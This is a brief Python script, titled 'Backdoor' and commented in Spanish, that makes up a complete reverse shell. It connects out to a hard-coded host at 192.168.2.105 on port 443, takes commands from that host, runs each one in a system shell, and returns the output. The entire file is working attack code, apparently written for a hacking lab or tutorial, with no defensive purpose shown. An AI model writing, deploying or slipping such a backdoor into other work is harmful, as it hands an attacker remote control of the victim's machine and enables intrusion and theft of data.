# /usr/bin/env python3
"""
Backdoor
"""

import signal
import socket
import subprocess


def handler(signum, frame):
    """
    Manejador de señales
    """
    print("\n\n[!] Saliendo...")
    exit(1)


signal.signal(signal.SIGINT, handler)


def run_command(command):
    """
    Ejecutar comandos
    """

    command_output = subprocess.check_output(command, shell=True)

    return command_output.decode("cp850")


if __name__ == '__main__':

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.2.105", 443))

    while True:
        command = s.recv(1024).decode().strip()
        command_output = run_command(command)

        s.send(b"" + command_output.encode() + b"")

    s.close()
